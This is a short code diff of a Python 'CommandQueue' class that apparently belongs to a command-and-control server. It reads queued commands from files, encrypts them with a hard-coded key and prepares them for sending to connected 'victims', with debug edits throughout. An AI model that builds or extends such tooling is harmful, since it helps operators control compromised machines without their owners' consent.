@@ -27,8 +27,8 @@ class CommandQueue():
     def _watch(self):
         """Watch subdirectories for commands to send to the victims
         """
-        if self.can_watch:
-            Timer(3, self._watch).start()
+        # if self.can_watch:
+        #     Timer(3, self._watch).start()
 
         print('yeet')
 
@@ -42,14 +42,17 @@ class CommandQueue():
                     commands = []
                     for line in f:
                         # Encrypt the commands
-                        commands.append(Encrypter.encrypt(line, 'secret'))
-                        commands.append(line)
+                        line = line.replace('\n', '')
+                        commands.append(Encrypter(line, 'secret').encrypt())
 
                     print(commands)
 
+                    for c in commands:
+                        print(Encrypter(c, 'secret').decrypt())
+
                     # Prepare for transmission
 
-                os.remove(dir + '/input/' + self.command_file) # Done reading file
+                # os.remove(dir + '/input/' + self.command_file) # Done reading file
 
     def _get_victim_dirs(self):
         """Get corresponding victims that connected to the server
